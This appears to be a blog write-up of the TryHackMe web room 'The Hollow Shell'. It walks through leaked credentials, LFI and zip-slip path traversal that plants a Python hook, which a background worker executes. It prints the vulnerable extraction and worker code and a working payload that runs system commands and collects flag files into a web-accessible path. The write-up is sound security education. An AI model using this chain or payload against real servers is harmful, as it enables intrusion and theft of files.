+++
title = 'The Hollow Shell | TryHackMe Room Writeup'
date = '2026-08-06T00:00:00+05:00'
lastmod = '2026-08-06T00:00:00+05:00'
draft = false
description = 'A beginner-friendly walkthrough of The Hollow Shell, a TryHackMe web challenge that combines a login leak, archive upload abuse, LFI, and server-side hook execution.'
categories = ['Writeups']
tags = ['TryHackMe', 'Web Security', 'LFI', 'File Upload', 'Archive Abuse']
topics = ['tryhackme']
toc = true
+++

Welcome to my writeup for the TryHackMe room **The Hollow Shell**. This one was a web challenge on a non-standard port, with a login page, an upload flow, and enough weird file handling to make the actual path to code execution feel like a small maze.

> **Spoiler warning:** This walkthrough reveals the room's solution path and the final flag, but the flag itself is masked.

## Getting In

The room exposed a URL on **port 5000** instead of the usual port 80, so the first thing I did was open the site directly on that port.

The page presented a login form. The source code of the login page gave away the credentials, so there was no need to brute-force anything.

Once logged in, the application showed an upload form for a shell package. The upload accepted a ZIP archive with a `shell.json` manifest in this format:

```json
{
  "name": "somename",
  "assets": [],
  "hooks": []
}
```

At first I tried to abuse the allowed file extensions. I managed to get code execution in an `.svg` file, but that did not lead anywhere useful. That dead end suggested the interesting behavior was not in the static asset handling itself.

## Looking For A Better Angle

The hint that eventually mattered was local file inclusion. I used the upload path and traversal tricks to look for readable application files, which exposed the Flask app and the background worker:

```text
app.py
```

```text
theme_worker.py
```

Fetching them through LFI was the turning point.

The main app logic showed three important details:

- the login credentials were hardcoded in `app.py`;
- uploads were extracted from a ZIP archive into a shell directory;
- the app accepted a `shell.json` manifest, but it only validated the declared asset list, not the entire archive content.

The extracted code looked like this:

```python
STAFF_USER = "concierge"
STAFF_PASS = "StayNoticed2024!"
```

That explained the login bypass immediately.

## Why The Upload Was Dangerous

The more interesting bug was in the ZIP extraction logic. The app trusted the archive names and wrote each file straight to disk:

```python
for name in zf.namelist():
    if name.endswith("/"):
        continue
    dest = os.path.join(shell_dir, name)
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    with open(dest, "wb") as fh:
        fh.write(zf.read(name))
```

That means a crafted archive could escape the intended shell directory by using path traversal in the filename.

The worker process was even better for an attacker. It watched the `hooks` directory and executed any Python file it found there:

```python
for path in sorted(glob.glob(os.path.join(HOOKS_DIR, "*.py"))):
    with open(path, "rb") as fh:
        code = fh.read()
    os.remove(path)
    proc = subprocess.Popen(
        [sys.executable, "-"],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    proc.stdin.write(code)
    proc.stdin.close()
```

That gave me the real exploit path:

- upload a ZIP archive;
- abuse path traversal to write a Python hook into the server's `hooks` directory;
- wait for the worker to pick it up and run it;
- have the payload write output into a web-accessible location under `shells/`.

## Building The Payload

My payload did two jobs: it gathered basic system information and searched for flag files, then wrote the results to a file I could fetch back over HTTP.

The archive content was structured so the traversal landed in the hooks directory. The manifest stayed valid because the app only checked the JSON shape and the declared asset extensions.

A simplified version of the payload looked like this:

```python
import os
import glob
import stat

base = os.path.dirname(
    next(iter(glob.glob('/**/theme_worker.py', recursive=True)), '/app')
)

out_dir = os.path.join(base, 'shells', 'pwn')
os.makedirs(out_dir, exist_ok=True)

out_path = os.path.join(out_dir, 'out.txt')
with open(out_path, 'w') as f:
    f.write(f"id: {os.popen('id').read().strip()}\n")
    f.write(f"host: {os.popen('hostname').read().strip()}\n\n")

    for flag in glob.glob('/**/flag*', recursive=True):
        try:
            if os.path.isfile(flag):
                f.write(f"== {flag} ==\n")
                with open(flag, 'r', errors='ignore') as ff:
                    f.write(ff.read() + '\n')
        except Exception as e:
            f.write(f"[error] {e}\n")

os.chmod(out_dir, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
os.chmod(out_path, stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH)
```

After uploading the ZIP, the worker executed the hook, and the output appeared at:

```text
/shells/pwn/out.txt
```

Opening that file in the browser gave me the flag.

```text
THM{[REDACTED]}
```

## Why The Exploit Worked

The weakness here was a combination of several smaller problems:

- the login secret was exposed in source code;
- the archive extraction trusted ZIP entry names;
- the worker executed Python files from a writable directory;
- the payload could write into a web-accessible path.

In practice, that meant a low-friction chain from disclosure to authentication bypass to arbitrary code execution.

```text
Leaked credentials
      ↓
Authenticated access
      ↓
ZIP upload with traversal
      ↓
Hook written to hooks/
      ↓
Worker executes Python payload
      ↓
Flag written to shells/pwn/out.txt
```

## Takeaways

This room was a good reminder that file upload issues often hide in the glue code around the upload rather than in the file type itself.

The useful habits here were:

- check for source disclosure when a web app feels too convenient;
- inspect server-side extraction logic for path traversal;
- treat background workers as part of the attack surface;
- look for a writeable path that is also web-accessible;
- do not stop after a dead end like the SVG code execution path if there is still unexplained server-side behavior.

The key lesson is that upload validation only helps if the server actually constrains where files land and what gets executed afterward. Once I found the worker, the room stopped being about file types and became about control of the server's file system.

And we're done!
